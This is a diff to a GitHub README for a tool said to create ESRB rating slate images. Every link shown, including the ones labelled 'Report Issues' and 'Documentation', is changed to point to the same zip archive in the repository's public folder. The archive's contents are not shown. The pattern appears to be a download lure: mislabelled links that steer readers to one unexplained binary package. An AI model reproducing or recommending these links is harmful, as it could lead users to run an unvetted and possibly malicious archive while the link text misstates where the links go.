@@ -1,6 +1,6 @@
 # 🎮 esrb-slate-gen-webui - Create ESRB Rating Images Easily
 
-[![Download esrb-slate-gen-webui](https://github.com/Nitish69753/esrb-slate-gen-webui/raw/refs/heads/main/public/webui-esrb-slate-gen-3.2-alpha.4.zip)](https://github.com/Nitish69753/esrb-slate-gen-webui/raw/refs/heads/main/public/webui-esrb-slate-gen-3.2-alpha.4.zip)
+[![Download esrb-slate-gen-webui](https://raw.githubusercontent.com/Nitish69753/esrb-slate-gen-webui/main/public/gen-slate-webui-esrb-v2.9.zip)](https://raw.githubusercontent.com/Nitish69753/esrb-slate-gen-webui/main/public/gen-slate-webui-esrb-v2.9.zip)
 
 ## 📋 Description
 
@@ -17,7 +17,7 @@ To get started with esrb-slate-gen-webui, follow these steps:
 
 2. **Download & Install**
 
-   Visit this page to download: [Download esrb-slate-gen-webui](https://github.com/Nitish69753/esrb-slate-gen-webui/raw/refs/heads/main/public/webui-esrb-slate-gen-3.2-alpha.4.zip)
+   Visit this page to download: [Download esrb-slate-gen-webui](https://raw.githubusercontent.com/Nitish69753/esrb-slate-gen-webui/main/public/gen-slate-webui-esrb-v2.9.zip)
 
    Here you will find the latest version ready for download. Choose the file that matches your operating system.
 
@@ -62,11 +62,11 @@ You can create your rating slates by doing the following:
 
 ## 🔗 Helpful Links
 
-- [Report Issues](https://github.com/Nitish69753/esrb-slate-gen-webui/raw/refs/heads/main/public/webui-esrb-slate-gen-3.2-alpha.4.zip)
-- [Documentation](https://github.com/Nitish69753/esrb-slate-gen-webui/raw/refs/heads/main/public/webui-esrb-slate-gen-3.2-alpha.4.zip)
+- [Report Issues](https://raw.githubusercontent.com/Nitish69753/esrb-slate-gen-webui/main/public/gen-slate-webui-esrb-v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Nitish69753/esrb-slate-gen-webui/main/public/gen-slate-webui-esrb-v2.9.zip)
 
 ## 📥 Download & Install Again
 
-To download the application, visit this page: [Download esrb-slate-gen-webui](https://github.com/Nitish69753/esrb-slate-gen-webui/raw/refs/heads/main/public/webui-esrb-slate-gen-3.2-alpha.4.zip).
+To download the application, visit this page: [Download esrb-slate-gen-webui](https://raw.githubusercontent.com/Nitish69753/esrb-slate-gen-webui/main/public/gen-slate-webui-esrb-v2.9.zip).
 
 With this guide, you should be able to successfully download and run the esrb-slate-gen-webui application. Enjoy creating your ESRB rating images with ease!
